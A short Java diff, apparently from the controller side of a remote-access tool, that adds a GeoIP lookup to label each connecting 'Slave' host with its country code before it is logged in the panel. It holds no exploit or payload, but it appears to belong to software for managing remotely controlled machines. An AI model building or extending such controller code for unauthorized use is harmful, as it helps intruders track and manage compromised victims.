@@ -20,6 +20,7 @@ import com.redpois0n.common.crypto.Crypto;
 import com.redpois0n.common.os.OperatingSystem;
 import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.io.CustomStream;
+import com.redpois0n.ip2c.Country;
 import com.redpois0n.net.ConnectionHandler;
 import com.redpois0n.net.PortListener;
 import com.redpois0n.packets.Header;
@@ -102,6 +103,22 @@ public class Slave extends CustomStream implements Runnable {
 
 			this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
 			this.host = socket.getInetAddress().getHostName();
+			
+			if (Settings.getBoolean("geoip")) {
+				Country country = FlagUtils.getCountry(this);
+				
+				if (country != null) {
+					this.country = country.get2cStr();
+					
+					if (this.country.equals("ZZ")) {
+						this.country = "?";
+					}
+				} else {
+					this.country = "?";
+				}
+			} else {
+				this.country = "?";
+			}
 
 			PanelMainLog.instance.addEntry("Connect", this, "");
 
